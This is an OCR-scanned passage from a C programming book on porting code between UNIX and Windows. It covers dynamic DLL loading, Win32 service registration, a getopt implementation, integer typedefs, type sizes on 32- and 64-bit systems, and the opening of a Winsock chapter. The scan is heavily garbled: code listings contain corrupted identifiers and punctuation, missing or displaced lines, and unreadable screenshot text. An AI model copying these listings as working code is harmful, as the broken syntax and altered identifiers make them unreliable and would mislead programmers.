h*>> Example 6.24 Win32 Dynamic Library Example (d!2.c) 
2 
' <312.c 
3 
-
4 
* 
5 
*/ 
6 
7 
^ i n c l u d e 
<windows+b> 
8 
#inclucie -catdio.h> 
9 
10 
((define 
DLL_PftTH - C : \ \ h o m e \ \ r n i k e \ \ b o o f c W t e s t . d l l " 
i 
((define 
SYMBOL 
"function_name" 
// remove l e a d i n g u n d e r s c o r e 

Writing Portable Code • Chapter 6 
255 
12 
13 int 
14 
main(void) 
15 { 
1 6 
void 
(*fpj 
0 ; 
17 
HANDLE h = MULL; 
18 
19 
h 
= LoadLibrary(DLL_PATH) ; 
20 
i f ( h == NULL) 
21 
{ 
22 
printf ("LoadLibrary {} 
failed. \r\n11) ; 
23 
return(l) ; 
24 
} 
25 
26 
£p 
= (void *) GetProcAddressth, SYMBOL); 
27 
i f f f p == NULL) 
28 
t 
29 
FreeLibrary(h) ; 
30 
printf("GetProcAddress() failed, symbol not found.\r\nn); 
31 
return(l) ; 
32 
) 
33 
34 
fp<>; 
35 
36 
FreeLibrary(h); 
37 
38 
return(l) ; 
39 } 
Analysis 
At lines 7 and 8, the windows. Ii and stdio. Ii header files are included. These 
header files are required for the priiUfQ and LoadLibrary family of functions. 
At line 10, the path to the DLL to be dynamically loaded is declared. 
At line 11, the name of the function to be dynamically linked is declared. In 
this case, we use the function name fti)ic!ion_)icwie as an example. 
At line 16, we declare function pointer variable fp that will be used to store the 
address of the function SYMBOL when it is linked. 
At line 19, the LoadLibraryQ function is called to open the DLL from which 
the function will be dynamically linked. 
At line 26, the GetProcAddressQ function is called to link the function. 
At line 34, the linked function is called via the function pointer^. 
At line 36, the handle to the shared library is closed using the FreeLibraryQ 
function. 

256 
Chapter 6 • Writing Portable Code 
Daemon/Win32 Service Programming 
Most UNIX platforms support the startup of background processes at system startup. 
These background processes arc known as daemons. Usually, two types of daemons are 
supported: those that are started by re files and run as independent processes, and those 
that are started by the inctd daemon for every new request made to the daemon's 
TCP/IP protocol and port. 
Programs launched by inctd arc more difficult to port, because they are dependent 
on using standard input and standard output to read and write data to the connected 
client.The Windows platform does not support this design by default. In this case, the 
programmer must explicidy add socket support to the program. 
Porting of a daemon program designed to be started by re files at system startup is 
relatively straightforward, because the Windows NT platform supports background pro-
cesses in the form of the Win32 services architecture. 
The Win32 services architecture requiring that a program to be run as a service, is 
registered with a system component known as the Service Control Manager (SCM). 
Once registered, the program appears in the Windows Services control panel and can be 
configured and controlled (see Figure 6.3). 
Figure 6.3 The Microsoft Windows 2000 Services Control Panel 
Fie 
Action 
vft* 
H H P 
• 'TED I f f 1 1 ^ [SI > • » •• 
4p Services (Local) 
Tesserwjer 
Stcc the swvra 
Restart the setvite 
DasctftKn: 
Trtftttnto net send and Alerter service 
fnessages between dents and servers. 
This 3C* "ice n not related to Wndows 
•Messenger. If ths service is stepped, 
Alert* tttHsages * d f o t t * t f a r r e t e d 
tf this service is dtsotfedr ony services 
that eaplcity depend en it M l f d i to 
£ l f t 
\ f ^'foied / Standard / 
N W * 
TjGencnc 
L&VKG 
^H0bVhd5UE!p»t 
^Kjfftori interface {>.. . 
^ [ M A - I ' l L ' - b j ' i r , ! . : . . 
*$) Internet rJomectn.,. 
^ t P 5 E C 5 e f vices 
^ i : * f p p Prf^onolfiTewo 
^ I c - j c a i D t s k Manage* 
^LoctcoJ Disk Ifamicie.. 
^hachheOebugMan.. 
% M S $cft«we Shade,.. 
% t * « Logcn 
% t f e c n a e U q Remote.. 
-1 
DeKnCbon 
Enables He.. 
EnaHesge... 
ManacjesC. 
Provides n. L. 
Manages I... 
Detects arn... 
Ceriums... 
ts.'r -•••' 
j 
Manage* s... 
St*pc*lip... 
Enables an... 
1 
^JDlxl 
iSafaa 
| ~] 
Started 
1 
J 
started 
5t*ted 
Sttrted 
A service can be registered with the SCM programmatically (see Example 6.25). 
The required parameters include a unique name used to identify the service to the 
SCM, the display name to be displayed in the Services control panel, and the absolute 
path to the service's executable image. 
" 4 " " Example 6.25 Service Control Manager Registration (semhe) 
i 
2 
* 
SCml.C 
3 
* 
4 
' 

Writing Portable Code • Chapter 6 
257 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
34 
35 
36 
37 
38 
39 
40 
41 
42 
43 
44 
45 
46 
47 
48 
49 
50 
51 
52 
53 
54 
^include ^windows.h> 
#include <stdio.h> 
#define 
#define 
#define 
SERVICE_NAME 
SERVICE_DISF 
SERVICE_EXEC 
"TestService" 
"Test Service 123" 
"C:WTestService.exe" 
main(void) 
{ 
SC_HANDLE sch = NULL; 
SC_HANDLE SVC = NULL; 
sch 
if (sch 
{ 
= OpenSCManagerfNULL, NULL, SC_MANAGER_CREATE_SERVICE) ; 
- NULL) 
printf("OpenSCManager() failed.\r\n"); 
return(l); 
svc = 
CreateService(sch 
if{svc 
{ 
SERVICE_NAME 
SERVICE_DISP 
STANDARD_RIGHTS_REQUIRED 
S ERVIC E_WI N3 2 _OWN_PROCES S 
S ERVIC E_DEHAND_START 
S ERVIC E_ERR0R_IGNORE 
SERVICE_EXEC 
NULL 
NUT.I, 
HULL 
NULL 
NULL); 
CloseServiceHandle(sch)j 
printf ("CreateServiceO failed.\r\n"); 
return(1); 
CloseServiceHandle(sch); 
CloseServiceHandle(svc); 
printf("*** service created.\r\n"); 
return(O); 
Example Execution 
Let's look at the Win32 output. 

258 
Chapter 6 • Writing Portable Code 
Win32 Output 
C:\Documents and Settings\Mike\ 
My DocuflientsAvisual Studio Pr o j ec t $A $-cml\ Debug >s cm 1 
*** service created. 
Analysis 
• 
At lines 7 and 8, the ttHtidtnvs.li and stdio.h header files are included.These 
header files are required for the printff) and SCM family of functions. 
• 
At line 10, the service name is defined.This is the name by which the service 
will be identified to the SCM. 
• 
At line 11, the service display name is defined. This is the name that will be 
displayed to users, such as in the Service control panel. 
• 
At line 12, the path to the service executable is defined. This is the executable 
that will be executed when the service is started. 
• 
At line 17, the variable sch is declared as type SC_HANDLE. This variable is 
used to store a handle to the SCM. 
• 
At line 18, the variable sve is declared as type S(1_HAI\DLE. This variable is 
used to store a handle to the newly created service. 
• 
At line 20, the Open&CManagerO function is called to obtain a handle to the 
SCM. 
• 
At line 28, the CreateServiceQ function is called to register the service with the 
SCM.This results in a registry key being created under 
HKHY_LOCAL_MACHINE\S YS TEM\Curre>itControlSct\Se>vkes 
identifying 
the service name, service display name, service executable path and various 
other parameters. 
• 
At lines 48 and 49, the previously opened handles are closed using the 
CloseServkeHandleQ function. 
Upon reloading the Services control panel, the Test Service is listed (see Figure 6.4). 
Next, we implement the ThtService program to demonstrate the minimal modifica-
tions required to convert a standard C program to a Win32 service, as illustrated in 
Example 6.26. 

Writing Portable Code • Chapter 6 
259 
Figure 6.4 The Services Control Panel after Creating a New Service 
- •* 
EH-CFGlia E3 
> ' 
• " 
^ j ^ n f K r i U o u f l 
\ E-i?'.:k] 
X •SttvjvAf 
Hm* 
• 
^Sytfem Event r « f t . 
%TCPfiPPMB[O^^H. 
^ T f r i i b T . ^ j r i r y . M 
*fcn>itfvntj|r-}ug and .. 
"1 
1 OtKTKKjp 
£i-5t«*Hj . 
Enfltfedrr.. 
Tf&dkjfytf.. 
Peffwrnsi .• 
EHtfenh... 
£ f j * f i r , 
Jlfcntmi* 
HHUQM4.. 
• - - - i . f — ; 
1 
*1£U*J 
ISA. r*i 
Jfcfft*d 
Stated 
5l*ted 
Shftwl 
.• 
T
^
: 
Stated 
g_bSCop = FALSE; 
g_hStatus; 
g_hRegStatus; 
Example 6.26 Minimal Win32 Service {TestService.c) 
1 (* 
2 
* TestService.c 
3 
* 
4 
« 
5 
•/ 
6 
7 
#include <windows.h> 
8 
9 
ft define SERVICEJiAME "TestService' 
10 
1 1 
BOOL 
1 2 
SERVICE. STATUS 
1 3 
SEKVICE_STATUS_HAIIDLE 
14 
15 /* 
1 6 
* UpdateService() 
17 
• 
18 -
19 
v 
20 VOID UpdateService 
(DWORD state) 
21 { 
22 
g__hS tatus.dwCurrentState = s t a t e ; 
23 
SetServiceStatus{g_hRegStatus, 
&g_hStatus) 
24 } 
25 
26 i* 
2.7 
* ServiceCtrlHandlerO 
28 ' 
29 > 
30 v 
31 static 
32 VOID WINAPI ServiceCcrlHandler (DWORD control) 
33 { 
34 
switch(control) 
35 
( 
36 
c a s e SERVICE_CONTROL_SHUTDOWN: 

Chapter 6 • Writing Portable Code 
37 
38 
39 
40 
41 
42 
43 
44 
45 
46 
47 
48 
49 
50 
51 
52 
53 
54 
55 
56 
57 
58 
59 
60 
61 
62 
63 
64 
65 
66 
67 
68 
69 
70 
71 
72 
73 
74 
75 
76 
77 
78 
79 
80 
81 
82 
83 
84 
85 
86 
87 
88 
89 
90 
91 
92 
case SERVICE_CONTROL_ST0P 
gJbStop = TRUE; 
break; 
default: 
break; 
* RegisterService() 
BOOL RegisterService() 
C 
memset(&g_hStatus 
, 0x00, sizeof(SERVICE_STATUS) 
) ; 
memset(&g_hRegStatus, 0x00, sizeof(SERVICE_STATUS_HANDLE)); 
g_hstatu5TdwServiceType 
g_hstatus.dwCurrentState 
g_hStatus.dwCorttrolsAccepted 
= SERVICE_WIN32_OWN_PROCESS; 
= SERVICE_START_PENDING; 
= SERVICE_ACCEPT_STOP 
S ERVIC E_ACCEPT_SH UTDOWN; 
g_hStatus,dwWin32ExitCode 
= N0_ERR0R; 
g_hStatus.dwCheckPoint 
= 0; 
g_hStatus.dwWaitHint 
= 0; 
g_hStatus.dwServiceSpecificExitCode = 0; 
g_hRegStatus = RegisterServiceCtrlHandler 
(SERVICE_NAME, ServieeCtrlHandler) ; 
return(g_hRegStatus != 0 ? TRUE : FALSE); 
ServiceMairt () 
VOID WINAPI ServiceMain 
HANDLE hnd = NULL; 
BOOL 
ret = FALSE; 
(DWORD 
argc 
LPSTR argv[] 
) 
ret 
= RegisterServicel); 
if(ret == FALSE) 
UpdateService(SERVICE_RUNNING); 

Writing Portable Code • Chapter 6 
261 
93 
/• 
94 
* custom code goes here. 
95 
v 
96 
97 
while(g_bStop == FALSE) 
98 
{ 
9 9 
SleepUOOO); 
100 
} 
101 
1 0 2 
UpdateService[SERVICE_STOPPED) ; 
103 } 
104 
105 int 
1 06 main (DWORD a r g c , 
LPSTR a r g v U ) 
107 { 
1 0 8 
SERVICE_TABLE_ENTR¥ dispTable[2) ; 
109 
BOOL 
rec 
= FALSE; 
110 
111 
memset(tdispTable, 0x00, sizeof(SERVICE_TABLE_ENTRY) * 2); 
112 
113 
dispTable[OJ.IpServiceName = SERVICE_NAME; 
1 14 
dispTable[0].IpServiceProc = ServiceMain ; 
115 
116 
// start service, service execution 
117 // begins in ServiceMain function 
118 
ret = 
119 
StartServiceCtrlDispatcher(dispTable); 
120 
121 
returnlret == FALSE ? 1 : 01; 
122} 
Analysis 
At line 106, the programs niaiuQ function is declared.This function serves only 
to set up the ServiccMaiu function.The SerukeMain function is then executed as 
the services main entry.The program in this example does nothing more than 
loop (line 97) until the Service is stopped by external intervention, at which 
point the program exits. 
At line 108, the dkplable variable is declared as type 
SERVICE_TABLE_EN'rRY(j. This variable is used to store the service name 
and ServiccMaiu function pointer, as shown at lines 113 and 114. 
At line 119, the StartScrvkeCtriDispatchcrQ function is used to execute the 
ServkeMciin() function. If execution is successful, this function will not return. 
Otherwise, a return value of FALSE will be returned. 
At line 79, the ServiccMaiu() function is declared.This function is where the 
initial logic of the service belongs. 
At line 85, the RcgisterServiceQ function (line 54) is called to register various 
properties of the service including the types of messages that can be sent to the 

262 
Chapter 6 • Writing Portable Code 
services (stmt, stop, restart, and so forth) and what actions to perform if the ser-
vice fails and more. 
• 
At line 91, the UpdateScrvkeQ function (line 20) is called with a value of SER-
VICE_RUNNING to notify the SCM that the service has started. 
• 
At line 97, a loop is performed until the global boolean variable, g_bStop, is not 
equal to TRUE. This loop sleeps, waiting for the $_bStop variable to change. 
The ServkeCtrlHcmdkrQ function declared at line 32 handles control messages 
sent to the service. In this example, only the SERVICE_CONTROL_SHUT-
DOWNsad SERVICE_CONTROL_STOP values are handled. If either is 
received, the global boolean g_bStop variable is set to TRUE, causing the loop 
declared at line 97 to fail and the service to terminate. 
• 
At line 102, if the g_bStop variable is set to TRUE, the loop at line 97 will 
break and the UpdateServkeQ function will be called with a value of SER-
VICE_STOPPED. This value indicates to the SCM that the service has termi-
nated. At this point the program should exit. 
The TestService program can be started via the Services control panel, as shown in 
Figure 6.5. 
Figure 6.5 The TestService Program Running in the Win32 Services Control 
Panel 
Ffc 
Atftft 
U«w 
Hefe 
+ lis &nm @ • • » « 
4fa ftntn (t««l) 
T « t 5 e t v f c e IZ3 
Stoo th* «*"•*» 
Restart the H T Y W 
\ EJendrd / H^iferd / 
Hunt •' 
% . 
. • . • . . . ! 
*feSmart Card Wtor 
fcestowSw.. 
%TCPJTP NetBIOS HcJ. 
% T * t e t 
% T e r r a n : ! 5 e r r t « 
% l > m t f r r ^ t J t P o * . 
%UmtfUlP1ug4rkl.. 
% L t 4 i s d MJftSfler 
'1 
Qex'&w 
ftuNeidw.. 
T w t e VfA- • 
Parf cms s.., 
Eiubta 4 • -
frcttow... 
PHTFTJCIT... 
EfUtJiJii.. 
Afewsmdt.. 
P w r i e i u . . . 
F i m d d i . . . 
1 
_JOJ_*J 
ISUhD 
1*1 
Sorted 
St0«trf 
Started 
Sorted 
Sorted 
awted 
, 
Sorted 
_ | 
Sated 
i 
I T 
For more information on Win32 service programming, search the 
http://msdn.microsoft.com Web site or Visual Studio documentation for "Service 
Control Manager." 
Memory Management 
Use of the standard C and C++ memory operators including malloc, free, new, and delete 
are supported by both the UNIX and Windows platforms. It is necessary to include the 
malloc.h header file when using the ma Hoc family of functions on the Windows platform. 

Writing Portable Code • Chapter 6 
263 
Example 6.27 demonstrates usage of the mattoc and free functions on the Windows 
platform. 
' • - » • " . 
Example 6.27 The MallocO Function (mallod.c) 
i 
/* 
2 
* mallocl.c 
3 
• 
4 
-
5 
v 
6 
7 
#include <stdio.h> 
8 
#include <malloc.h> 
9 
10 
void 
11 
main(void) 
12 
t 
13 
void *p = NULL; 
14 
15 
p 
(void «] malloo(lO); 
16 
i f ( p == NULL) 
17 
( 
18 
printf("malloc(} 
failed.\r\n"); 
19 
return; 
20 
} 
21 
22 
£ree|p>; 
23 ) 
Analysis 
• 
At line 15, the niallocO function is called to allocate 10 bytes of memory.This 
function is cross-platform compatible. 
Command-line Argument Processing 
On most UNIX platforms, command-line argument processing is handled using the 
getopt function.This function parses arguments passed to a program via the command 
line, with each option and possible argument made available to the programmer via a 
switch statement. The Windows platform does not support the get op I function by default. 
A simple iniplementarion ofmegetopt function is presented in Example 6.28, and can be 
used to port programs written for the UNIX platform that use the getopt function. 
Example 6.28 getopt Header File (getopt.h) 
1 t* 
2 
* getopt.h 
3 
• 
4 
* 
5 
-/ 
6 
7 
ttifndef 
GETOPT_H 
8 
#deflne 
GETaPT_H_ 
9 

264 
Chapter 6 • Writing Portable Code 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
Sifdef . 
Lcplusplus 
e x t e r n "C 
{ 
irendif 
e x t e r n i n t 
o p t e r r ; 
e x t e r n 
char 
* o p t a r g ; 
/* 
* g e t o p t O 
' 
* 
V 
char 
g e t o p t ( i n t 
argc 
f t i f d e f 
c p l u s p l u s 
} 
ttendif 
#endif /* 
GETDPT_H. 
char *argv[] , char *fmt); 
Analysis 
At lines 14 and 15, the global constants optcrr and optarg are declared. The optcrr 
variable is set by the getopt () function if an error is encountered while pro-
cessing command line options. The optarg variable is assigned the value of a 
command-line option if one is supplied. These variables are declared as extern 
and are defined in Example 6.2%getopt.c. 
At line 22, the getoptQ function is declared.The first argument should be the 
argc variable passed to the calling programs iiiainQ function.The second argu-
ment should be the argi> variable passed to the calling program's main() func-
tion.The third argument should be an option specifier string such as abed, 
where individual characters specify the option, and if followed by a : character, 
indicate that the option requires a value (e.g.,program —a —b —c i'nlite—d). 
:. v M l ! '- I 
^^B 
Example 6.29 Simple ge 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
/* 
* getopt.. c 
* 
-
*/ 
ttinclude ^getopt.h* 
If i n c l u d e <stdio.h> 
# i n c l u d e 
<:ctype.h> 
# i n c l u d e 
<:string.h> 
ftdefine 
GETOPT_ERR 
' 1 
S 
define 
GETOPT_END 
i n t 
o p t e r r = 0; 
char *optarg = NULL; 

Writing Portable Code • Chapter 6 
265 
17 
18 /* 
19 
* getoptl) 
20 * 
21 
* ,/program -a apple -o orange -c cookie 
22 «/ 
23 
24 static int idx = 1; 
25 
26 char getopt(int argc, char *argv[], char *fmt) 
27 { 
28 
29 
30 
31 
32 
33 
34 
35 
36 
37 
38 
39 
40 
41 
42 
43 
44 
45 
46 
47 
48 
49 
50 
51 
52 
53 
54 
55 
55 
57 
58 
59 
60 
61 
62 
63 
64 
65 
66 
67 
68 
69 
70 
71 
72 
73 } 
char *opts = NULL; 
char *fmts = NULL; 
char *args = NULL; 
char 
tmp[3) ; 
if {iclx >= argc) 
{ 
return(<3ET0PT_END) ; 
> 
o p t a r g • NULL; 
o p t s 
= a r g v [ i d x + + ] ; 
i f ( s t r l e n ( o p t s ) 
!= 
2 | j 
o p t s [ 0 ] 
!= • - ' ( 
t 
return(GETOFT_ERR); 
} 
trnpIO) = o p t s [ 1 1 ; 
tmp[1] = ' : ' j 
tmp[ 2 ] = ' \ 0 ' ; 
fmts 
= s t r s t r f f m t , 
tmp); 
i f ( f m t s == NULL) 
( 
tmp 11] = 'NO'; 
fmts 
= s t r s t r (fmt, 
tmp); 
i f ( f m t s == NULL) 
{ 
/ / n o t i n 
return{GETOPT_ERR); 
} 
r e t u r n ( t m p [ 0 ) ) ; 
> 
i f { i d x >= argc) 
( 
return(GETOPT_ERR); 
} 
o p t a r g = a r g v [ i d x + + ) ; 
r e t u r n ( t m p [ 0 ] ) ; 

266 
Chapter 6 • Writing Portable Code 
Analysis 
• 
At line 26, the getopt Q function is declared. 
• 
At lines 28 through 31, local variables are declared that are used for parsing the 
command-line option and option specifier string, 
• 
At lines 38 through 70, the command-line arguments are parsed based upon 
the option specifier string, with the option specified being returned from the 
function, and optionally the value for the option being assigned to the optarg 
global variable. 
Example 6.30 shows code for the get opt test program. 
Example 6.30 getopt Test Program (main.c) 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
5tj 
34 
35 
JO 
37 
38 
39 
40 
t* 
' main.c 
* 
* Win32 getopt example 
*/ 
ttinclude <st<lio.h> 
tt include "getopt.h" 
i :i-
mairHint argc, char *argv[]} 
! 
char "test = NULL; 
char 
ch 
= 0 ; 
int 
flag = 0; 
opterr = 0; 
whilellch = getopt(argc, argv, "t:f*)l 
( 
switch(ch) 
C 
case 
' t ' : 
test = optarg; 
break; 
case ' f ' : 
flag = 1; 
break; 
default: 
printf("unknown option 
return(1)? 
} 
i f ( t e s t == NULL) 
C 
!= -1) 
\r\n"> 

Writing Portable Code • Chapter 6 
267 
41 
printf("no value supplied for test . \r\ri") ; 
42 
return(1)j 
43 
} 
44 
45 
printf ("test: %s „ flag: %d\r\n", test, flag) ; 
46 
47 
return(O); 
48 } 
Example Execution 
Let's look at the Win32 output. 
Win32 Output 
C: \Documents and Settings\Mik.e\ 
My Documents\Visual Studio Projects\getopt\Debug>getopt 
no value supplied for test. 
C;\Documents and Settings\Mike\ 
My Documents\Visual Studio Projects\getopt\Debug>getopt -t 
unknown option. 
C:\Documents and Settings\Mike\ 
My Documents\Visual Studio Projects\getopt\Debug>getopt -t cancun 
test: cancun , flag: 0 
C:\Documents and Settings\Mike\ 
My Documents\Visual Studio Projects\getopt\Debug>getopt -t cancun -f 
test: cancun , flag: 1 
Analysis 
• 
At line 18, the getoptQ function is called in a while loop, once for each com-
mand-line option supplied to the program. 
• 
At line 20, the option returned from the getoptQ function is evaluated using a 
switch statement. Depending on the option specified, one of the switch case 
statements will be executed. 
• 
At line 32, a default case is supplied that will handle unknown option values or 
the error value returned by the getoptQ function. 
Integer Data Types 
For UNIX operating systems that use the GCC compiler, the sys/types.li header file is 
often included intprogram source code to enable use of the more compact and portable 
data type syntax. This syntax consists of the token hit or u_int, followed by the width of 
the data type in bits, followed by the token _t. For example, u_hit8_t, intl6_t, ii_intJ2_tt 
and so on. 

268 
Chapter 6 • Writing Portable Code 
By default, these definitions are not available on the Windows platform. If this 
syntax is encountered when porting code, it will be necessary to convert all variable 
declarations to syntax declared in an available header file, to include a freely available 
port of the sys/typa.h header file from a UNIX system or to author a header file that 
defines the data types in use. 
The header file in Example 6.31 can be used for compatibility with integer data 
types as found in sys/types.h on many UNIX operating systems (including Linux, *BSD, 
and so on). 
Example 6.31 Portable Data Type Header File {types.h) 
1 
/* 
2 
* t y p e s , h 
3 
* 
4 
' 
5 
* 
6 
-
7 
v 
8 
9 
H f n d e f ( 
TVPES_H 
} 
10 
# define TYPES_H 
11 
1 2 
t i f n d e f 
u _ i n t 8 _ t 
13 
typedef unsigned e h a r u _ i n t 8 _ t ; 
1 4 f t e n d i f 
1 5 
1 6 
ttifndef 
u „ i n t r s _ t 
17 
typedef unsigned s h o r t 
u _ i n t ! 6 _ t 
; 
18 
ftendif 
19 
20 
ttifndef 
u_int32_t 
21 
typedef unsigned i n t 
u _ i n t 3 2 _ t 
; 
2 2 
t e n d i f 
23 
2 4 
t i f n d e f 
u _ i n t 6 4 _ t 
25 
typedef unsigned 
Lint64 
u _ i n t 6 4 _ t 
; 
26 
ttendif 
27 
28 
t e n d i f f* 
T¥PES_H 
•/ 
Analysis 
• At line 12, an ifndef pre-compiler directive is used to determine if the u_int8_i 
data type has been declared. If it has not, the unsigned char data type is lypcdcf'd 
as n_int8_t.The same logic is used at lines 16, 20 and 24 for the \i_iutl6_t, 
U_JtU32_J, and n_int64_l data types. 

Writing Portable Code * Chapter 6 
269 
Summary 
The most complicated part of creating portable applications is finding good documenta-
tion on API usage and preparing a test environment. Even with the proper test environ-
ment, it is only a matter of time until trial and error has to statistically pan out. After you 
determine the platform and correct usage, it is just a matter of time until the entire pro-
gram is ready for testing. The next chapter completes the series and details all of the 
shortcomings of network application development. 
Solutions Fast Track 
UNIX and Microsoft Windows Porting Guide 
0 
Varying operating systems, compilers, and languages execute code and com-
piled programs in different manners. The art of writing a flexible code base 
that can properly work on these different systems is referred to as writing 
portable code. 
Frequently Asked Questions 
The following Frequently Asked Questions, answered by the authors of this book, 
are designed to both measure your understanding of the concepts presented in 
this chapter and to assist you with real-life implementation of these concepts. To 
have your questions about this chapter answered by the author, browse to 
www.syngress.com/solutions and click on the "Ask the Author" form. You will 
also gain access to thousands of other FAQsatlTFAQnet.com. 
Q: The porting fork functionality seems to be the most difficult function in terms of 
cross-platform development, any idea why? 
A: We are firm believers that once you learn the Microsoft development APIs you 
will either love them or hate them, yet in either case, they are not going any-
where fast. Process jorkinj> the Microsoft way was done to increase the amount of 
flexibility within process and thread management. An excellent class is just 
waiting to be created that will allow for the automated cross-platform usage for 
process handling. 
Q: How do you recommend creating reusable code for these scenarios? 
Al Programming characteristics are as personable and subjective as writing poetry; 
however, as a general recommendation, we would say to put the code into a class 
www.syngress.com 

270 
Chapter 6 • Writing Portable Code 
or multiple classes. Using the object-oriented model would allow you to instan-
tiate objects throughout your code in an efficient and secure manner. 
Q: Are there any noticeable differences between 64-bit operating systems in com-
parison to 32-bit in terms of creating portable code? 
Al Absolutely. At a minimum, in most cases you will be required to recompile the 
source of the program on the desired platform. Depending on the platform, you 
may also come across other undesirable ramifications such as poor device-driver 
implementation support, library modifications, and memory management issues. 
The following example illustrates some of the changes that will be noticed by 
merely compiling it on a different platform. 
Versus 64-bit Compilers 
(include <stdio.h> 
int mainlint argc, char *argv[J) 
( 
(void! printfC'My Test Char is \t\t%lu bytes\n", sizeof (char) ( ; 
(void! printfC'My Test Short is \t%lu bytes\n", sizeof (short)); 
(void) printfCWy Test Int is \t\t%lu bytes\n", sizeof (int)); 
(void) printfC'My Test Long is \t\t%lu bytes\n*. sizeof (long)); 
(void) printfCMy Test Long Long is \t\t%lu bytes\n*H sizeof (long long)); 
(void) printfCMy Test Pointer is \t%lu bytes \n", sizeof (void *) ) ; 
(void) printf("Test Completed!\n"); 
return (0); 
) 
Execution 
Examples 6.32 and 6.33 are of the same program, yet compiled and executed on dif-
ferent platforms.The first is a 32-bit while the second is a 64-bit. 
Example 6.32 Compiled and Executed on a 32-bit Operating System 
Gabriei_root$\ cc -0 -d 
Gabriel_root$\ test32 
My Test Char is 
My Test Short is 
My Test Int is 
My Test Long is 
My Test Long Long 
My Test Pointer is 
Test Completed! 
is 
test32 test32he 
i bytes 
2 bytes 
4 bytes 
4 bytes 
a bytes 
4 bytes 
Example 6,33 Compiled and Executed on a 64-bit Operating System 
Gabriel_rootS\ cc -xarch=v9 -Q -o test64 test64.c 
Gabriel_rootS\ test64 
My Test Char is 
1 bytes 
www.syngress.com 

Writing Portable Code * Chapter 6 
271 
My Test Short is 
2 bytes 
Hy Test Int is 
4 bytes 
My Test Long is 
8 bytes 
Hy Test Long Long is 
8 bytes 
Hy Test Pointer is 
8 bytes 
Test Completed! 
Analysis 
• 
Lines 4 through 'J print out a simple statement to STDOUT containing a vari-
able and the platform's definition or size associated with that variable. The 
tfzecf function used at the end of each line returns the number of bytes for 
each instance. 
• 
Line I (I lets you know the program has completed. 
NOTE 
The previous program was created, tested, and executed on Solaris 9. 
; 
Ql What technologies or tools exist to help me verify that I am correctly program-
ming cross-compatible, dual- compatible, or platform-independent code? 
A:There are multiple tools, software applications, and compilers that will help you 
do your job; however, at the time of publication, there is no single solution that 
could be considered the "one-stop-shop" for developing, testing, and running 
platform-independent code. The best tools are the freely and commercially avail-
able libraries that can be utilized throughout your programs. In most cases, there 
is no reason to reinvent the wheel in terms of writing all new code for any large 
project. WXWindows (www.wxwindows.org) is a great example of a freely 
available platform-independent graphical user interface (GUI) library or frame-
work that can be extended to create applications with GUIs that run on various 
platforms yet remain to be one unified code base. 
A


Chapt 
Portable Network 
Programming 
Solutions in this Chapter: 
BSD Sockets and Winsock 
Portable Components 
Related Chapters: Chapter 6 
• 
IZI Summary 
0 Solutions Fast Track 
IZI Frequently Asked Questions 

274 
Chapter 7 • Portable Network Programming 
Introduction 
Advanced network programming techniques have historically been one of the most dif-
ficult programming Theories to grasp.The "Sockets" section of this book addresses the 
particulars of proper socket initialization, closing sockets, reading data, and writing. 
This chapter describes the particulars of writing code that will compile and run on 
both UNIX/Linux platforms as well as Microsoft Windows, without requiring any 
modifications. 
Using ij'def and endif statements and knowing the different libraries that are required 
for certain functions to be called within the program, are key when developing plat-
form-independent code. Gaining access to the raw sockets within a program allows pro-
grams to potentially manipulate and transmit packets even though they may not 
conform to all of the Remote Procedure Call (RPC) standards. All of these concepts are 
discussed and illustrated in this chapter. 
The last major section of code that this chapter covers is packet-capturing differen-
tiators on Windows versus UNIX. We look at how to develop code that will capture 
packets on either system and then prepare such data for analysis or computation. 
NOTE 
AM of the example source code in this chapter was written and compiled on 
OpenBSD 3.2 / x86 using the GNU C compiler version 2.95.3, the tcsh command 
shell version 6.12.00, and Microsoft Windows XP using Microsoft Visual 
Studio.NET 2002. 
BSD Sockets and Winsock 
Berkeley Software Distribution (BSD) sockets and the Microsoft Winsock programming 
interface are two largely compatible application program interfaces (APIs) used for net-
work programming. With a few minor modifications, mast socket code written for rhe 
UNIX platform can be ported to the Windows platform and vice versa. 
This section details the standard BSD sockets and Winsock programming interfaces, 
compatibility issues between the two APIs, and how to write cross-platform-compatible 
code using both. We begin with Winsock-specific requirements for socket code, and 
then we look at handling the return values of socket functions and obtaining extended 
error information and commonly used socket functions. 
Winsock Requirements 
The Microsoft Windows platform provides socket and raw socket support via the 
Winsock programming interface. Before using any of the Winsock APIs, it is necessary 
to initialize the Winsock framework. 

Portable Network Programming • Chapter 7 
275 
The Winsock-specific WSAStarttfpQ function is used to initialize Winsock. It takes 
two arguments: an unsigned short value that indicates the version of Winsock to be 
used, and a pointer to a WSADATA structure where details of the initialized Winsock 
implementation are stored. 
The first argument is typically formed using the MAKEWORD macro, which com-
bines two H-bit values into a single unsigned 16-bit value.The WSAStartup function is 
not supported by the BSD sockets interface and as such, must be excluded from compi-
lation using ifdcf pre-compiler directives when compiled on nou-Win32 platforms. 
Example 7.1 demonstrates initialization of Winsock using the WSASnutup function. 
This code uses ifdcf pre-compiler directives to ensure that initialization occurs only if 
the code is compiled on the Windows platform. 
^ " " Example 7.1 Winsock Initialization (winsock!.c) 
1 
2 
* winsockl.0 
3 
* 
4 
* 
5 
*/ 
6 
7 
Sifdef WIN32 
8 
9 
ttpragma comment(lib, "ws2_32.lib") 
/* required for winsock */ 
10 
ii 
#include <winsock2.h> 
12 
13 
#else 
14 
15 
f* UNIX-specific header files includes */ 
16 
17 
#endif 
18 
19 
#include <stdicTh> 
20 
21 
int 
22 
main(void) 
23 f 
24 
ttifdef 
WIN32 
25 
WSADATA visa; 
26 
/* additional Win32-specific variables */ 
27 
Seise 
28 
/* UNIX-specific variables */ 
29 
Sendif 
30 
31 
#ifdef WIN32 
32 
/* initialize winsock */ 
33 
if(WSAStartup(MAKEWORD<2, 0), iwsa| != 0x0) 
34 
( 
35 
printf("WSAStartupll 
failed.\n")i 
36 
return (1); 
37 
) 
38 
Kendif 
39 
40 
/* 

276 
Chapter 7 • Portable Network Programming 
41 
* ready to use sockets API 
42 
v 
43 
44 
retum{OI; 
45 } 
Analysis 
• 
